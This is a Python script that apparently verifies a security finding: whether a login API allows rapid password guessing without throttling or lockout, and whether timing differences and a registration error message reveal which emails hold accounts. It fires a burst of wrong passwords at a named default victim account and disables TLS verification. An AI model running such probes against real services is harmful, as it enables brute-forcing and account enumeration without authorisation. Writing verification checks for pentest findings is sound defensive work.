     1	#!/usr/bin/env python3
     2	"""Verify: /auth/login lacks anti-automation and /auth exposes account-enumeration
     3	oracles (timing on /auth/login + differential message on /auth/register).
     4	
     5	Exits 0 when the vulnerability is still present (VULNERABLE), 1 when the
     6	target has been fixed or the check errors out (NOT VULNERABLE).
     7	
     8	Required environment variables:
     9	    VICTIM_PASSWORD     Real password for the account used to verify
    10	                        that no lockout occurred after the failed burst.
    11	
    12	Optional (override defaults):
    13	    TARGET_URL          Base URL (default: https://api.taintedport.com)
    14	    VICTIM_USERNAME     (default: luis.grangeia@snyk.io)
    15	
    16	Usage:
    17	    export VICTIM_PASSWORD=...
    18	    python3 verify.py
    19	"""
    20	import os
    21	import statistics
    22	import sys
    23	import time
    24	import uuid
    25	
    26	import requests
    27	import urllib3
    28	
    29	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    30	
    31	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    32	VICTIM_USERNAME = os.environ.get("VICTIM_USERNAME", "luis.grangeia@snyk.io")
    33	VICTIM_PASSWORD = os.environ.get("VICTIM_PASSWORD")
    34	
    35	REQUIRED_VARS = ["VICTIM_PASSWORD"]
    36	
    37	BURST_COUNT = 20
    38	TIMING_SAMPLES = 10
    39	TIMING_DELTA_MS = 30  # ms — minimum difference to call the timing oracle observable
    40	
    41	
    42	def preflight():
    43	    missing = [v for v in REQUIRED_VARS if not os.environ.get(v)]
    44	    if missing:
    45	        print("ERROR: missing required environment variables:")
    46	        for v in missing:
    47	            print(f"  {v}")
    48	        print("\nSet them and re-run. See docstring for details.")
    49	        sys.exit(1)
    50	
    51	
    52	def _login(email, password):
    53	    return requests.post(
    54	        f"{TARGET_URL}/auth/login",
    55	        json={"email": email, "password": password},
    56	        timeout=15,
    57	        verify=False,
    58	    )
    59	
    60	
    61	def check():
    62	    preflight()
    63	
    64	    # 1) Burst brute-force
    65	    codes = []
    66	    t0 = time.time()
    67	    for i in range(BURST_COUNT):
    68	        codes.append(_login(VICTIM_USERNAME, f"wrong-{i}-{uuid.uuid4().hex[:6]}").status_code)
    69	    burst_secs = time.time() - t0
    70	    burst_only_401 = set(codes) == {401}
    71	    not_throttled = not any(c in (429, 423, 403) for c in codes)
    72	
    73	    # Confirm account NOT locked
    74	    r = _login(VICTIM_USERNAME, VICTIM_PASSWORD)
    75	    not_locked = r.status_code == 200
    76	
    77	    # 2) Timing oracle
    78	    valid_times, invalid_times = [], []
    79	    for _ in range(TIMING_SAMPLES):
    80	        t = time.time()
    81	        _login(f"nope-{uuid.uuid4().hex[:12]}@no-such-domain-x.example", "x")
    82	        invalid_times.append(time.time() - t)
    83	        t = time.time()
    84	        _login(VICTIM_USERNAME, "x")
    85	        valid_times.append(time.time() - t)
    86	    v_med = statistics.median(valid_times) * 1000
    87	    i_med = statistics.median(invalid_times) * 1000
    88	    timing_leak = (v_med - i_med) > TIMING_DELTA_MS
    89	
    90	    # 3) Registration oracle
    91	    r_exist = requests.post(
    92	        f"{TARGET_URL}/auth/register",
    93	        json={"name": "X", "email": VICTIM_USERNAME, "password": "Password123!"},
    94	        timeout=15, verify=False,
    95	    )
    96	    reg_leak = r_exist.status_code == 409 and "already" in r_exist.text.lower()
    97	
    98	    # Verdict
    99	    print(f"burst: {BURST_COUNT} in {burst_secs:.1f}s, codes={set(codes)}, "
   100	          f"account_still_works={not_locked}")
   101	    print(f"timing: valid_median={v_med:.0f}ms invalid_median={i_med:.0f}ms "
   102	          f"delta={v_med - i_med:+.0f}ms")
   103	    print(f"register_oracle: HTTP {r_exist.status_code}  {r_exist.text[:140]}")
   104	
   105	    if burst_only_401 and not_throttled and not_locked and timing_leak and reg_leak:
   106	        print("[VULNERABLE] No anti-automation on /auth/login; timing + registration oracles present.")
   107	        sys.exit(0)
   108	    print("[NOT VULNERABLE] One or more indicators absent — apparent mitigation.")
   109	    sys.exit(1)
   110	
   111	
   112	if __name__ == "__main__":
   113	    check()